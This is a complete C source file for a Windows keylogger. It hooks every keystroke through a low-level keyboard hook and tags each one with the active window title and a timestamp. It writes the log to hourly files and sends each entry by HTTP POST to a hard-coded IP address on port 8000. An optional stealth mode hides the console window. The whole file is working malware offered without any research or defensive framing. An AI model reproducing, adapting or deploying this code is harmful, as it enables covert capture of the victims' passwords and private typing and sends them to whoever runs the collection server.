#define UNICODE
#include <Windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")

#define visible
#define bootwait
#define FORMAT 0
#define mouseignore

typedef struct
{
    int key;
    const char *name;
} KeyName;

#if FORMAT == 0
const KeyName keyname[] = {
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CONTROL]"},
    {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"},
    {VK_OEM_PERIOD, "."},
    {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"},
    {VK_OEM_MINUS, "-"},
    {VK_ADD, "+"},
    {VK_SUBTRACT, "-"},
    {VK_CAPITAL, "[CAPSLOCK]"},
};

const char *get_key_name(int vk)
{
    int count = sizeof(keyname) / sizeof(KeyName);
    for (int i = 0; i < count; i++)
    {
        if (keyname[i].key == vk)
        {
            return keyname[i].name;
        }
    }
    return NULL;
}

int keyname_exists(int vk)
{
    int count = sizeof(keyname) / sizeof(KeyName);
    for (int i = 0; i < count; i++)
    {
        if (keyname[i].key == vk)
            return 1;
    }
    return 0;
}
#endif
HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);

FILE *output_file = NULL;

char output_filename[32];
int cur_hour = -1;

LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT *)lParam);

            Save(kbdStruct.vkCode);
        }
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void send_log_http(const char *log)
{
    char json[512];
    snprintf(json, sizeof(json),
             "{ \"keyboardData\": \"%s\" }", log);

    HINTERNET hSession = WinHttpOpen(
        L"MyApp/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession)
        return;

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        L"192.168.116.147",
        8000,
        0);

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"/",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);

    WinHttpSendRequest(
        hRequest,
        L"Content-Type: application/json\r\n",
        -1,
        json,
        (DWORD)strlen(json),
        (DWORD)strlen(json),
        0);

    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

void sanitize(char *s)
{
    for (; *s; s++)
    {
        if (*s == '"')
            *s = '\'';
        else if (*s == '\n')
            *s = ' ';
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    char output[512];
    output[0] = '\0';

    sprintf_s(
        output + strlen(output),
        sizeof(output) - strlen(output),
        "Key: ");

    sprintf_s(
        output + strlen(output),
        sizeof(output) - strlen(output),
        "%d",
        key_stroke);

    static char lastwindow[256] = "";
#ifndef mouseignore
    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0;
    }
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    // get time
    struct tm tm_info;
    const time_t t = time(NULL);
    localtime_s(&tm_info, &t);

    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);

            char s[64];
            strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);

            snprintf(
                output + strlen(output),
                sizeof(output) - strlen(output),
                "\n\n[Window: %s - at %s] ",
                window_title,
                s);
        }
    }

#if FORMAT == 10
    snprintf(output + strlen(output),
             sizeof(output) - strlen(output),
             "[%d]", key_stroke);
#elif FORMAT == 16
    snprintf(output + strlen(output),
             sizeof(output) - strlen(output),
             "[%d]", key_stroke);
#else
    if (keyname_exists(key_stroke))
    {
        snprintf(output + strlen(output),
                 sizeof(output) - strlen(output),
                 "%s", get_key_name(key_stroke));
    }
    else
    {
        char key;

        // Check capslock
        int lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // Check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase)
        {
            key = tolower(key);
        }
        snprintf(output + strlen(output),
                 sizeof(output) - strlen(output),
                 "%c", key);
    }
#endif

    if (cur_hour != tm_info.tm_hour)
    {
        cur_hour = tm_info.tm_hour;

        if (output_file)
        {
            fclose(output_file);
        }

        strftime(output_filename,
                 sizeof(output_filename),
                 "logs/%Y-%m-%d__%H-%M-%S.log",
                 &tm_info);

        if (fopen_s(&output_file, output_filename, "a") != 0)
        {
            output_file = NULL;
        }
    }

    if (output_file)
    {
        fputs(output, output_file);
        fflush(output_file);
    }

    sanitize(output);
    send_log_http(output);

    printf("%s", output);

    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

boolean IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

int main()
{
    Stealth();

#ifdef bootwait
    while (IsSystemBooting())
    {
        printf("System is still booting up.");
        Sleep(5000);
    }
#endif

#ifdef nowait
    printf("Skipping boot metrics check.");
#endif

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}